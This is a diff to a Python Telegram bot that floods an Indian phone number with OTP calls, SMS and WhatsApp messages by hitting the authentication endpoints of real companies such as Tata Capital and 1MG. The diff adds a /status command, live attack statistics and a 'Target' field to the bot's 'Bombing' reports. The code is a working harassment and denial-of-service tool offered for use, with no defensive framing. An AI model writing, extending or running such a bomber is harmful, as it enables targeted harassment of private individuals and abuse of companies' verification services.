@@ -24,7 +24,7 @@ if not BOT_TOKEN:
 
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-# ---------- ULTIMATE 900+ APIS (FULL LIST FROM ORIGINAL CODE) ----------
+# ---------- ULTIMATE 900+ APIS (FULL LIST) ----------
 ULTIMATE_APIS = [
     {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
     {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
@@ -126,8 +126,10 @@ ULTIMATE_APIS = [
 # ---------- CONVERSATION STATES ----------
 WAITING_FOR_PHONE = 1
 
+# Per-user data
 active_attacks: Dict[int, asyncio.Task] = {}
 stop_events: Dict[int, asyncio.Event] = {}
+current_stats: Dict[int, dict] = {}   # user_id -> stats dict for /status
 
 # ---------- ATTACK CLASS ----------
 class UltimatePhoneDestroyer:
@@ -139,7 +141,7 @@ class UltimatePhoneDestroyer:
         self.stats = {
             "total": 0, "hits": 0, "fails": 0,
             "calls": 0, "wa": 0, "sms": 0,
-            "start": time.time(), "apis": len(ULTIMATE_APIS)
+            "start": time.time(), "apis": len(ULTIMATE_APIS), "phone": phone
         }
         self.last_update = time.time()
 
@@ -175,6 +177,9 @@ class UltimatePhoneDestroyer:
                         else:
                             self.stats["fails"] += 1
 
+                # Update global stats for /status command
+                current_stats[self.user_id] = self.stats.copy()
+
                 if time.time() - self.last_update > 5:
                     await self.update_callback(self.user_id, self.stats, final=False)
                     self.last_update = time.time()
@@ -191,6 +196,8 @@ class UltimatePhoneDestroyer:
                 t.cancel()
             await asyncio.gather(*tasks, return_exceptions=True)
         await self.update_callback(self.user_id, self.stats, final=True)
+        # Cleanup
+        current_stats.pop(self.user_id, None)
 
 # ---------- HELPER ----------
 async def send_stats(chat_id: int, stats: dict, final: bool = False):
@@ -200,6 +207,7 @@ async def send_stats(chat_id: int, stats: dict, final: bool = False):
     rate = (stats["hits"] / stats["total"] * 100) if stats["total"] else 0
     header = "💀 FINAL REPORT 💀" if final else "🔥 LIVE STATS 🔥"
     msg = f"""{header}
+🎯 Target: +91{stats['phone']}
 📞 Calls: {stats['calls']} | 📱 WA: {stats['wa']} | 💬 SMS: {stats['sms']}
 ✅ Hits: {stats['hits']} | ❌ Fails: {stats['fails']} | 🎯 Total: {stats['total']}
 📊 Success: {rate:.1f}% | ⏱️ Time: {elapsed:.1f}s
@@ -239,6 +247,15 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Cancelled.")
     return ConversationHandler.END
 
+async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show current attack stats for the user."""
+    user_id = update.effective_user.id
+    if user_id in current_stats:
+        stats = current_stats[user_id]
+        await send_stats(update.effective_chat.id, stats, final=False)
+    else:
+        await update.message.reply_text("ℹ️ No active attack. Use /start to begin.")
+
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -251,7 +268,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id in active_attacks and not active_attacks[user_id].done():
             await query.answer("Already running!")
             return
-        await query.edit_message_text(f"🚀 Bombing +91{phone} with {len(ULTIMATE_APIS)} APIs...")
+        await query.edit_message_text(f"🚀 Bombing +91{phone} with {len(ULTIMATE_APIS)} APIs...\nUse /status for live stats.")
         stop_events[user_id] = asyncio.Event()
         destroyer = UltimatePhoneDestroyer(phone, user_id, stop_events[user_id], send_stats)
         task = asyncio.create_task(destroyer.start())
@@ -276,6 +293,7 @@ def main():
     )
     app.add_handler(conv)
     app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(CommandHandler("status", status_cmd))
     print("Bot running...")
     app.run_polling()
 
